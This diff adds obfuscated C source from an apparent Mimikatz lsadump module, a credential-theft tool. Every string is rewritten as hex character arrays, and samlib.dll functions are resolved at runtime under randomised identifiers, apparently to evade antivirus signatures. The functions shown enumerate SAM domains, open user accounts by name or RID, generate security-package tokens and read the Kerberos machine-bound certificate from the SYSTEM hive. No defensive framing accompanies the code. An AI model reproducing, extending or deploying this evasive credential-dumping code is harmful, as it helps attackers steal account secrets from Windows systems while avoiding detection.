+	TCHAR hid_samlib_0qirSNpdbXHK[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_GurtLbGdX0UL = LoadLibrary(hid_samlib_0qirSNpdbXHK);
+	TCHAR hid_SamEnu_7TyqEfwF9kCp[] = {'\x53','\x61','\x6d','\x45','\x6e','\x75','\x6d','\x65','\x72','\x61','\x74','\x65','\x44','\x6f','\x6d','\x61','\x69','\x6e','\x73','\x49','\x6e','\x53','\x61','\x6d','\x53','\x65','\x72','\x76','\x65','\x72',0};
+
+	_SamEnumerateDomainsInSamServer hid_SamEnu_ut01UrP9w3rQ = (_SamEnumerateDomainsInSamServer) GetProcAddress(hid_hHandl_GurtLbGdX0UL, hid_SamEnu_7TyqEfwF9kCp);
+	TCHAR hid_samlib_SZ1Yn798Jfjt[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_QnZwfshTRuXD = LoadLibrary(hid_samlib_SZ1Yn798Jfjt);
+	TCHAR hid_SamFre_LjRiPwxOvA0b[] = {'\x53','\x61','\x6d','\x46','\x72','\x65','\x65','\x4d','\x65','\x6d','\x6f','\x72','\x79',0};
+
+	_SamFreeMemory hid_SamFre_uhxjvVHlBy99 = (_SamFreeMemory) GetProcAddress(hid_hHandl_QnZwfshTRuXD, hid_SamFre_LjRiPwxOvA0b);
+	TCHAR hid_samlib_6gk4BZaeOFhV[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_QtlhUvOYrWTC = LoadLibrary(hid_samlib_6gk4BZaeOFhV);
+	TCHAR hid_SamFre_IGqeU4rfJrN7[] = {'\x53','\x61','\x6d','\x46','\x72','\x65','\x65','\x4d','\x65','\x6d','\x6f','\x72','\x79',0};
+
+	_SamFreeMemory hid_SamFre_BowIyQwWXKir = (_SamFreeMemory) GetProcAddress(hid_hHandl_QtlhUvOYrWTC, hid_SamFre_IGqeU4rfJrN7);
+	TCHAR hid_samlib_F1v1AB4VC2cx[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_nLKPmrhp2FzK = LoadLibrary(hid_samlib_F1v1AB4VC2cx);
+	TCHAR hid_SamFre_tmPgBFHLY1YP[] = {'\x53','\x61','\x6d','\x46','\x72','\x65','\x65','\x4d','\x65','\x6d','\x6f','\x72','\x79',0};
+
+	_SamFreeMemory hid_SamFre_5vupdAu0d3xg = (_SamFreeMemory) GetProcAddress(hid_hHandl_nLKPmrhp2FzK, hid_SamFre_tmPgBFHLY1YP);
+	TCHAR hid_samlib_sfxYLPA2A7Bl[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_SKVCGRkdqCwO = LoadLibrary(hid_samlib_sfxYLPA2A7Bl);
+	TCHAR hid_SamFre_ig5tUrEmJOGZ[] = {'\x53','\x61','\x6d','\x46','\x72','\x65','\x65','\x4d','\x65','\x6d','\x6f','\x72','\x79',0};
+
+	_SamFreeMemory hid_SamFre_ZWLhu7v3mQbD = (_SamFreeMemory) GetProcAddress(hid_hHandl_SKVCGRkdqCwO, hid_SamFre_ig5tUrEmJOGZ);
+	typedef NTSTATUS(__stdcall* _SamLookupDomainInSamServer)(SAMPR_HANDLE ServerHandle, PUNICODE_STRING Name, PSID * DomainId);
+	TCHAR hid_samlib_O8LTyCJhs7vm[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_hxENbFeq3GI4 = LoadLibrary(hid_samlib_O8LTyCJhs7vm);
+	TCHAR hid_SamLoo_BanEW41OaByc[] = {'\x53','\x61','\x6d','\x4c','\x6f','\x6f','\x6b','\x75','\x70','\x44','\x6f','\x6d','\x61','\x69','\x6e','\x49','\x6e','\x53','\x61','\x6d','\x53','\x65','\x72','\x76','\x65','\x72',0};
+
+	_SamLookupDomainInSamServer hid_SamLoo_dzeeasO67dF6 = (_SamLookupDomainInSamServer) GetProcAddress(hid_hHandl_hxENbFeq3GI4, hid_SamLoo_BanEW41OaByc);
+	TCHAR hid_samlib_EalYmcdf5cjM[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_8PUa9hgjihVN = LoadLibrary(hid_samlib_EalYmcdf5cjM);
+	TCHAR hid_SamLoo_E1Rs821DUSJr[] = {'\x53','\x61','\x6d','\x4c','\x6f','\x6f','\x6b','\x75','\x70','\x4e','\x61','\x6d','\x65','\x73','\x49','\x6e','\x44','\x6f','\x6d','\x61','\x69','\x6e',0};
+
+	_SamLookupNamesInDomain hid_SamLoo_Ox9cEjqunfKi = (_SamLookupNamesInDomain) GetProcAddress(hid_hHandl_8PUa9hgjihVN, hid_SamLoo_E1Rs821DUSJr);
+	TCHAR hid_samlib_1g2c8A4u9Ddu[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_ycyMgEwWRkgb = LoadLibrary(hid_samlib_1g2c8A4u9Ddu);
+	TCHAR hid_SamOpe_yAwIvR9ZcA0O[] = {'\x53','\x61','\x6d','\x4f','\x70','\x65','\x6e','\x44','\x6f','\x6d','\x61','\x69','\x6e',0};
+
+	_SamOpenDomain hid_SamOpe_W7sh6MzzxcI6 = (_SamOpenDomain) GetProcAddress(hid_hHandl_ycyMgEwWRkgb, hid_SamOpe_yAwIvR9ZcA0O);
+	TCHAR hid_samlib_jmFj6HzElll9[] = {'\x73','\x61','\x6d','\x6c','\x69','\x62','\x2e','\x64','\x6c','\x6c',0};
+
+	HANDLE hid_hHandl_rr5F7wwUYarc = LoadLibrary(hid_samlib_jmFj6HzElll9);
+	TCHAR hid_SamOpe_VrTcghkt8jf7[] = {'\x53','\x61','\x6d','\x4f','\x70','\x65','\x6e','\x55','\x73','\x65','\x72',0};
+
+	_SamOpenUser hid_SamOpe_sRybgJq4AOiJ = (_SamOpenUser) GetProcAddress(hid_hHandl_rr5F7wwUYarc, hid_SamOpe_VrTcghkt8jf7);
+NTSTATUS status = STATUS_INVALID_ACCOUNT_NAME, enumDomainStatus;
+	LSA_UNICODE_STRING serverName, userName;
+	PCWCHAR szServer, szUser;
+	BOOL isUser = FALSE, isRid = FALSE;
+	DWORD i, domainEnumerationContext = 0, domainCountRetourned, rid = 0, *pRid, *pUse;
+	PSAMPR_RID_ENUMERATION pEnumDomainBuffer;
+	PSID domainSid;
+	SAMPR_HANDLE hServerHandle, hDomainHandle, hUserHandle;
+
+	kull_m_string_args_byName(argc, argv, L"server", &szServer, NULL);
+	RtlInitUnicodeString(&serverName, szServer ? szServer : L"");
+	kprintf(hid_T_a_r__yyAyoxct0pJ4, &serverName);
+	if(isUser = kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
+	{
+		RtlInitUnicodeString(&userName, szUser);
+		kprintf(hid_T_a_r__551X48Vwtbiy, &userName);
+	}
+	else if(isRid = kull_m_string_args_byName(argc, argv, L"rid", &szUser, NULL))
+	{
+		rid = wcstoul(szUser, NULL, 0);
+		kprintf(hid_T_a_r__TfluZtnEnkuj, rid);
+	}
+
+	if(isUser || isRid)
+	{
+		status = hid_SamCon_BHUQgFPdkLFs(&serverName, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS | SAM_SERVER_LOOKUP_DOMAIN, FALSE);
+		if(NT_SUCCESS(status))
+		{
+			do
+			{
+				enumDomainStatus = hid_SamEnu_ut01UrP9w3rQ(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountRetourned);
+				if(NT_SUCCESS(enumDomainStatus) || enumDomainStatus == STATUS_MORE_ENTRIES)
+				{
+					for(i = 0; i < domainCountRetourned; i++)
+					{
+						if(RtlEqualUnicodeString(&pEnumDomainBuffer[i].Name, &uBuiltin, TRUE))
+							continue;
+						kprintf(hid_D_o_m__baaGu9vlkSsQ, &pEnumDomainBuffer[i].Name);
+						status = hid_SamLoo_dzeeasO67dF6(hServerHandle, &pEnumDomainBuffer[i].Name, &domainSid);
+						if(NT_SUCCESS(status))
+						{
+							kprintf(hid_D_o_m__jVasenjCeHH9);
+							kull_m_string_displaySID(domainSid);
+							kprintf(L"\n");
+							status = hid_SamOpe_W7sh6MzzxcI6(hServerHandle, DOMAIN_LOOKUP, domainSid, &hDomainHandle);
+							if(NT_SUCCESS(status))
+							{
+								if(isUser)
+								{
+									isRid = FALSE;
+									pRid = NULL;
+									pUse = NULL;
+									status = hid_SamLoo_Ox9cEjqunfKi(hDomainHandle, 1, &userName, &pRid, &pUse);
+									if(NT_SUCCESS(status))
+									{
+										rid = pRid[0];
+										isRid = TRUE;
+									}
+									else PRINT_ERROR(L"SamLookupNamesInDomain: %08x\n", status);
+								}
+
+								if(isRid)
+								{
+									kprintf(hid_U_s_e__vXrn7y5vqlTN, rid);
+									status = hid_SamOpe_sRybgJq4AOiJ(hDomainHandle, dwUserAccess, rid, &hUserHandle);
+									if(NT_SUCCESS(status))
+									{
+										status = callback(hUserHandle, pvArg);
+										hid_SamClo_2EJVEuFwZfBZ(hUserHandle);
+									}
+									else PRINT_ERROR(L"SamOpenUser: %08x\n", status);
+								}
+								else PRINT_ERROR(L"No RID\n");
+
+								if(isUser)
+								{
+									if(pRid)
+										hid_SamFre_5vupdAu0d3xg(pRid);
+									if(pUse)
+										hid_SamFre_ZWLhu7v3mQbD(pUse);
+								}
+								hid_SamClo_fo6ggQbGCEU4(hDomainHandle);
+							}
+							else PRINT_ERROR(L"SamOpenDomain: %08x\n", status);
+							hid_SamFre_BowIyQwWXKir(domainSid);
+						}
+						else PRINT_ERROR(L"SamLookupDomainInSamServer: %08x\n", status);
+					}
+					hid_SamFre_uhxjvVHlBy99(pEnumDomainBuffer);
+				}
+				else PRINT_ERROR(L"SamEnumerateDomainsInSamServer: %08x\n", enumDomainStatus);
+			}
+			while(enumDomainStatus == STATUS_MORE_ENTRIES);
+			hid_SamClo_2lqxIO97TzyU(hServerHandle);
+		}
+		else PRINT_ERROR(L"SamConnect: %08x\n", status);
+	}
+	else PRINT_ERROR(L"/user or /rid is needed\n");
+	return status;
+}
+
+
+const wchar_t  hid_I_N_T__aeRq9u2rwJas[] = {'\x49','\x4e','\x54','\x45','\x47','\x52','\x49','\x54','\x59',0};
+
+const wchar_t  hid_P_R_I__4szHEmnrNCFy[] = {'\x50','\x52','\x49','\x56','\x41','\x43','\x59',0};
+
+const wchar_t  hid_T_O_K__OQItsBNpRgUI[] = {'\x54','\x4f','\x4b','\x45','\x4e','\x5f','\x4f','\x4e','\x4c','\x59',0};
+
+const wchar_t  hid_D_A_T__btBE69RSWJiQ[] = {'\x44','\x41','\x54','\x41','\x47','\x52','\x41','\x4d',0};
+
+const wchar_t  hid_C_O_N__5HuEe9Wu89Qb[] = {'\x43','\x4f','\x4e','\x4e','\x45','\x43','\x54','\x49','\x4f','\x4e',0};
+
+const wchar_t  hid_M_U_L__FjGVOaVdBjeq[] = {'\x4d','\x55','\x4c','\x54','\x49','\x5f','\x52','\x45','\x51','\x55','\x49','\x52','\x45','\x44',0};
+
+const wchar_t  hid_C_L_I__ZHGJpqWw2ty2[] = {'\x43','\x4c','\x49','\x45','\x4e','\x54','\x5f','\x4f','\x4e','\x4c','\x59',0};
+
+const wchar_t  hid_E_X_T__YXn3fuDGdM0B[] = {'\x45','\x58','\x54','\x45','\x4e','\x44','\x45','\x44','\x5f','\x45','\x52','\x52','\x4f','\x52',0};
+
+const wchar_t  hid_I_M_P__Q1R4w8DxlgGS[] = {'\x49','\x4d','\x50','\x45','\x52','\x53','\x4f','\x4e','\x41','\x54','\x49','\x4f','\x4e',0};
+
+const wchar_t  hid_A_C_C__KwCPm0e7hmR9[] = {'\x41','\x43','\x43','\x45','\x50','\x54','\x5f','\x57','\x49','\x4e','\x33','\x32','\x5f','\x4e','\x41','\x4d','\x45',0};
+
+const wchar_t  hid_S_T_R__zPBfBHPulzPG[] = {'\x53','\x54','\x52','\x45','\x41','\x4d',0};
+
+const wchar_t  hid_N_E_G__IG13XpfBWHYo[] = {'\x4e','\x45','\x47','\x4f','\x54','\x49','\x41','\x42','\x4c','\x45',0};
+
+const wchar_t  hid_G_S_S__uFekFWnGV6oX[] = {'\x47','\x53','\x53','\x5f','\x43','\x4f','\x4d','\x50','\x41','\x54','\x49','\x42','\x4c','\x45',0};
+
+const wchar_t  hid_L_O_G__bA03zTHB333E[] = {'\x4c','\x4f','\x47','\x4f','\x4e',0};
+
+const wchar_t  hid_A_S_C__nxLX3wfEprPt[] = {'\x41','\x53','\x43','\x49','\x49','\x5f','\x42','\x55','\x46','\x46','\x45','\x52','\x53',0};
+
+const wchar_t  hid_F_R_A__Np2MwfYoac0i[] = {'\x46','\x52','\x41','\x47','\x4d','\x45','\x4e','\x54',0};
+
+const wchar_t  hid_M_U_T__mr1ikeI24uHX[] = {'\x4d','\x55','\x54','\x55','\x41','\x4c','\x5f','\x41','\x55','\x54','\x48',0};
+
+const wchar_t  hid_D_E_L__GkffytUGglFA[] = {'\x44','\x45','\x4c','\x45','\x47','\x41','\x54','\x49','\x4f','\x4e',0};
+
+const wchar_t  hid_R_E_A__Tp8WL6LuWn7p[] = {'\x52','\x45','\x41','\x44','\x4f','\x4e','\x4c','\x59','\x5f','\x57','\x49','\x54','\x48','\x5f','\x43','\x48','\x45','\x43','\x4b','\x53','\x55','\x4d',0};
+
+const wchar_t  hid_R_E_S__25YVS4Svad4G[] = {'\x52','\x45','\x53','\x54','\x52','\x49','\x43','\x54','\x45','\x44','\x5f','\x54','\x4f','\x4b','\x45','\x4e','\x53',0};
+
+const wchar_t  hid_N_E_G__Kt9Rn57fE52j[] = {'\x4e','\x45','\x47','\x4f','\x5f','\x45','\x58','\x54','\x45','\x4e','\x44','\x45','\x52',0};
+
+const wchar_t  hid_N_E_G__BkFU4YS36rwc[] = {'\x4e','\x45','\x47','\x4f','\x54','\x49','\x41','\x42','\x4c','\x45','\x32',0};
+
+const wchar_t  hid_A_P_P__71KTuD97fQwK[] = {'\x41','\x50','\x50','\x43','\x4f','\x4e','\x54','\x41','\x49','\x4e','\x45','\x52','\x5f','\x50','\x41','\x53','\x53','\x54','\x48','\x52','\x4f','\x55','\x47','\x48',0};
+
+const wchar_t  hid_A_P_P__VzD2vOSYHvCw[] = {'\x41','\x50','\x50','\x43','\x4f','\x4e','\x54','\x41','\x49','\x4e','\x45','\x52','\x5f','\x43','\x48','\x45','\x43','\x4b','\x53',0};
+PCWCHAR PACKAGES_FLAGS[] = {
+	hid_I_N_T__aeRq9u2rwJas, hid_P_R_I__4szHEmnrNCFy, hid_T_O_K__OQItsBNpRgUI, hid_D_A_T__btBE69RSWJiQ,
+	hid_C_O_N__5HuEe9Wu89Qb, hid_M_U_L__FjGVOaVdBjeq, hid_C_L_I__ZHGJpqWw2ty2, hid_E_X_T__YXn3fuDGdM0B,
+	hid_I_M_P__Q1R4w8DxlgGS, hid_A_C_C__KwCPm0e7hmR9, hid_S_T_R__zPBfBHPulzPG, hid_N_E_G__IG13XpfBWHYo,
+	hid_G_S_S__uFekFWnGV6oX, hid_L_O_G__bA03zTHB333E, hid_A_S_C__nxLX3wfEprPt, hid_F_R_A__Np2MwfYoac0i,
+	hid_M_U_T__mr1ikeI24uHX, hid_D_E_L__GkffytUGglFA, hid_R_E_A__Tp8WL6LuWn7p, hid_R_E_S__25YVS4Svad4G,
+	hid_N_E_G__Kt9Rn57fE52j, hid_N_E_G__BkFU4YS36rwc, hid_A_P_P__71KTuD97fQwK, hid_A_P_P__VzD2vOSYHvCw,
+};
+NTSTATUS kuhl_m_lsadump_packages(int argc, wchar_t * argv[])
+{
+	
+	 wchar_t  hid_N_a_m__iqL2ut3owoic[] = {'\x4e','\x61','\x6d','\x65','\x20','\x20','\x20','\x20','\x20','\x20','\x20','\x20','\x3a','\x20','\x25','\x73','\n','\x44','\x65','\x73','\x63','\x72','\x69','\x70','\x74','\x69','\x6f','\x6e','\x20','\x3a','\x20','\x25','\x73','\n','\x43','\x61','\x70','\x61','\x62','\x69','\x6c','\x69','\x74','\x69','\x65','\x73','\x3a','\x20','\x25','\x30','\x38','\x78','\x20','\x28','\x20',0};
+
+	 wchar_t  hid___s____k2MpBX2TuFEZ[] = {'\x25','\x73','\x20','\x3b','\x20',0};
+
+	 wchar_t  hid_____M__hZ0ejwlxsR3G[] = {'\x29','\n','\x4d','\x61','\x78','\x54','\x6f','\x6b','\x65','\x6e','\x20','\x20','\x20','\x20','\x3a','\x20','\x25','\x75','\n','\x52','\x50','\x43','\x49','\x44','\x20','\x20','\x20','\x20','\x20','\x20','\x20','\x3a','\x20','\x30','\x78','\x25','\x30','\x34','\x78','\x20','\x28','\x25','\x68','\x75','\x29','\n','\x56','\x65','\x72','\x73','\x69','\x6f','\x6e','\x20','\x20','\x20','\x20','\x20','\x3a','\x20','\x25','\x68','\x75','\n',0};
+SECURITY_STATUS status;
+	ULONG cPackages, i, j;
+	PSecPkgInfo pPackageInfo;
+	CredHandle hCred;
+	CtxtHandle hCtx;
+	SecBuffer OutBuff = {0, SECBUFFER_TOKEN, NULL};
+	SecBufferDesc Output = {SECBUFFER_VERSION, 1, &OutBuff};
+	ULONG ContextAttr;
+
+	status = EnumerateSecurityPackages(&cPackages, &pPackageInfo);
+	if(status == SEC_E_OK)
+	{
+		for(i = 0; i < cPackages; i++)
+		{
+			kprintf(hid_N_a_m__iqL2ut3owoic, pPackageInfo[i].Name, pPackageInfo[i].Comment, pPackageInfo[i].fCapabilities);
+			for(j = 0; j < sizeof(ULONG) * 8; j++)
+				if((pPackageInfo[i].fCapabilities >> j) & 1)
+					kprintf(hid___s____k2MpBX2TuFEZ, (j < ARRAYSIZE(PACKAGES_FLAGS)) ? PACKAGES_FLAGS[j] : L"?");
+			kprintf(hid_____M__hZ0ejwlxsR3G, pPackageInfo[i].cbMaxToken, pPackageInfo[i].wRPCID, pPackageInfo[i].wRPCID, pPackageInfo[i].wVersion);
+
+			if(argc)
+			{
+				status = AcquireCredentialsHandle(NULL, pPackageInfo[i].Name, SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &hCred, NULL);
+				if(status == SEC_E_OK)
+				{
+					status = InitializeSecurityContext(&hCred, NULL, argv[0], ISC_REQ_ALLOCATE_MEMORY, 0, SECURITY_NATIVE_DREP, NULL, 0, &hCtx, &Output, &ContextAttr, NULL);
+					if((status == SEC_E_OK) || (status == SEC_I_COMPLETE_AND_CONTINUE)  || (status == SEC_I_COMPLETE_NEEDED)  || (status == SEC_I_CONTINUE_NEEDED)  || (status == SEC_I_INCOMPLETE_CREDENTIALS)  || (status == SEC_E_INCOMPLETE_MESSAGE))
+					{
+						kull_m_string_wprintf_hex(OutBuff.pvBuffer, OutBuff.cbBuffer, 1 | (16 << 16));
+						kprintf(L"\n");
+						if(OutBuff.pvBuffer)
+							FreeContextBuffer(OutBuff.pvBuffer);
+						DeleteSecurityContext(&hCtx);
+					}
+					else PRINT_ERROR(L"InitializeSecurityContext: 0x%08x\n", status);
+					FreeCredentialHandle(&hCred);
+				}
+				else PRINT_ERROR(L"AcquireCredentialsHandle: 0x%08x\n", status);
+			}
+			kprintf(L"\n");
+		}
+		FreeContextBuffer(pPackageInfo);
+	}
+	else PRINT_ERROR(L"EnumerateSecurityPackages: 0x%08x\n", status);
+	return STATUS_SUCCESS;
+}
+
+BOOL kuhl_m_lsadump_mbc_data(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hSystemBase)
+{
+	
+	const wchar_t  hid_C_o_n__qX1P3PyiVoqk[] = {'\x43','\x6f','\x6e','\x74','\x72','\x6f','\x6c','\\','\x4c','\x73','\x61','\\','\x4b','\x65','\x72','\x62','\x65','\x72','\x6f','\x73','\\','\x50','\x61','\x72','\x61','\x6d','\x65','\x74','\x65','\x72','\x73',0};
+
+	const wchar_t  hid_M_a_c__bQrimUQX93TD[] = {'\x4d','\x61','\x63','\x68','\x69','\x6e','\x65','\x42','\x6f','\x75','\x6e','\x64','\x43','\x65','\x72','\x74','\x69','\x66','\x69','\x63','\x61','\x74','\x65',0};
+
+	 wchar_t  hid_M_a_c__yMRMVGy6dGGO[] = {'\x4d','\x61','\x63','\x68','\x69','\x6e','\x65','\x42','\x6f','\x75','\x6e','\x64','\x43','\x65','\x72','\x74','\x69','\x66','\x69','\x63','\x61','\x74','\x65',0};
+BOOL status = FALSE;
+	HKEY hCurrentControlSet;
+	PBYTE data;
+	DWORD dataLen;
+
+	if(kuhl_m_lsadump_getCurrentControlSet(hRegistry, hSystemBase, &hCurrentControlSet))
+	{
+		if(kull_m_registry_OpenAndQueryWithAlloc(hRegistry, hCurrentControlSet, hid_C_o_n__qX1P3PyiVoqk, hid_M_a_c__bQrimUQX93TD, NULL, (LPVOID *) &data, &dataLen))
+		{
+			kuhl_m_crypto_system_data(data, dataLen, hid_M_a_c__yMRMVGy6dGGO, FALSE);
+			LocalFree(data);
+		}
+		kull_m_registry_RegCloseKey(hRegistry, hCurrentControlSet);
+	}
+	return status;
+}
+
+NTSTATUS kuhl_m_lsadump_mbc(int argc, wchar_t * argv[])
+{
+	
+	const wchar_t  hid_S_Y_S__2Z76kgq2tESw[] = {'\x53','\x59','\x53','\x54','\x45','\x4d',0};
+HANDLE hDataSystem;
+	PKULL_M_REGISTRY_HANDLE hRegistry;
+	HKEY hBase;
+	LPCWSTR szSystem = NULL;
+
+	if(kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL))
+	{
+		hDataSystem = CreateFile(szSystem, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+		if(hDataSystem != INVALID_HANDLE_VALUE)
+		{
+			if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSystem, FALSE, &hRegistry))
+			{
+				kuhl_m_lsadump_mbc_data(hRegistry, NULL);
+				kull_m_registry_close(hRegistry);
+			}
+			CloseHandle(hDataSystem);
+		}
+		else PRINT_ERROR_AUTO(L"CreateFile (SYSTEM hive)");
+	}
+	else
+	{
+		if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_OWN, NULL, FALSE, &hRegistry))
+		{
+			if(kull_m_registry_RegOpenKeyEx(hRegistry, HKEY_LOCAL_MACHINE, hid_S_Y_S__2Z76kgq2tESw, 0, KEY_READ, &hBase))
+			{
+				kuhl_m_lsadump_mbc_data(hRegistry, hBase);
+				kull_m_registry_RegCloseKey(hRegistry, hBase);
+			}
+			kull_m_registry_close(hRegistry);
+		}
+	}
+	return STATUS_SUCCESS;
+}
